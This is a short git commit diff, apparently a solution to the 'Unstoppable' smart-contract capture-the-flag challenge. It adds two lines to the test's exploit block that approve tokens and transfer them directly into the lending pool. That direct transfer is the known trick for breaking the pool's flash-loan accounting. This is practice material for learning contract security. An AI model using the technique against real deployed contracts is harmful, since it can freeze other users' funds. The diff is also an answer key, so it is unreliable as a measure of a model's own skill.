60ca2314267f42ff3588af410554a2016168c50d
Jeffrey Kam <jeffreykam0415@gmail.com>
2022-09-17 04:26:51 -0400

    q1

--- test/unstoppable/unstoppable.challenge.js
+++ test/unstoppable/unstoppable.challenge.js
@@ -40,6 +40,8 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        await this.token.connect(attacker).approve(deployer.address, INITIAL_ATTACKER_TOKEN_BALANCE);
+        await this.token.transferFrom(attacker.address, this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
     });
 
     after(async function () {
